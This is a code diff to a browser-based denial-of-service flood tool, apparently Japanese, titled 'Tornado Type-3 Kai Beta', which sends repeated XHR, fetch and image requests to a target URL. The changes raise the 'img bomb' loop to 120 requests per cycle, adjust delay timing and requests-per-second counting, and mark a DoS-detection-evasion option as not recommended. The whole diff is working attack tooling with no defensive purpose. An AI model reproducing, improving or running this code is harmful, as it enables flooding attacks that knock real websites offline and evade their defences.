@@ -25,7 +25,7 @@
 	    var ifmoded = "Thu, 01 Jun 1970 00:00:00 GMT";
         var BDnum = 60
         const randRange = (min, max) => Math.floor(Math.random() * (max - min + 1) + min);
-        //const my_sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+        const my_sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
         // ワイルドカード設定
         var randomCards0="*,$,@,+,<,>,!,(,)".split(",");
@@ -251,11 +251,14 @@ function sleep(waitMsec) {
   while (new Date() - startMsec < waitMsec);
 }
 
+
+
 async function RequestGenerator(mode) {
   //BypassDos用の遅延処理
   if (IsBypassDos==1) {
         sleep(randRange(10, 300));
-        console.log("SLEEP");
+        //await my_sleep(randRange(10, 300))
+        //console.log("IsBypassDos is " + IsBypassDos + "遅延処理" + "SLEEP");
     } else {}
 
     if (mode==1) {
@@ -282,8 +285,8 @@ async function RequestGenerator(mode) {
 			xhr.setRequestHeader("Content-Type", contype);
 			xhr.send(POSTDATA);
     } else if (mode==5) {
-            xhr2.open(method2, URL, async);
-	  	    xhr2.setRequestHeader("Pragma", "no-cache");
+      xhr2.open(method2, URL, async);
+	  	xhr2.setRequestHeader("Pragma", "no-cache");
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", lang);
@@ -310,15 +313,24 @@ async function RequestGenerator(mode) {
 			var req2 = new Request(URL, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((POSTDATA))});
 			fetch(req2);
     } else if (mode==10) {
-          for (i=0; i<100; i++) {
+          //デバッグ
+          Nowdate = Date.now();
+
+          for (i=0; i<120; i++) {
             //img bomb
+            UrlGenerator();
             imgurl = URL + `?${(new Date).getTime()}`
             var img = new Image();
             img.src = imgurl
             //デバッグ
-            console.log( i + "回目のimg")
+            //console.log( i + "回目のimg")
             //sleep(randRange(300, 400));
           }
+
+          Nowdate2 = Date.now();
+          rps = 100 / (Nowdate2 - Nowdate) * 1000;
+          await my_sleep(randRange(610, 900));
+
 
     } else {
         //もしもの時のため
@@ -333,18 +345,17 @@ function modeselect() {
     HeaderInfoGenerator();
     Nowdate = Date.now();
     for(i = 0; i < m_inWinNum; i++) {
-        RequestGenerator(mode);
-
+      RequestGenerator(mode);
       if (MODE==10) {
       console.log("sleep at mode10")
-      sleep(randRange(650, 900));
+      //sleep(randRange(610, 900));
+      
     } else {}
 
     }
     bombCounter();
     Nowdate2 = Date.now();
     rps = m_inWinNum / (Nowdate2 - Nowdate) * 1000;
-    
 	  m_toDoing = setTimeout("modeselect()", m_inInterval);
     
 }
@@ -858,7 +869,7 @@ details[open] .summary_inner::after {
     </style>
 
     <body  class="backgroundcolor"  style="font-size: 35;">
-        <h1>トルネード三式・改 【Beta版 by新参者】</h1>
+        <h1>トルネード三式・改 Beta版 by 新参者</h1>
         <b>[2024.04.15版]</b>
         <br>
         <br>
@@ -888,7 +899,7 @@ details[open] .summary_inner::after {
         </div>
         <br>
         <input type="checkbox" disabled>
-        <label for="inq4">Dos検知回避機能を使用する<font color="red">[Beta](説明欄必読)</font></label>
+        <label for="inq4">Dos検知回避機能を使用する<mark><font color="red">[非推奨](説明欄必読)</font></mark></label>
         <div class="toggle_button">
             <input  id="BypassDosDetection" class="toggle_input" type='checkbox'/>
            <label for="toggle2" class="toggle_label" />
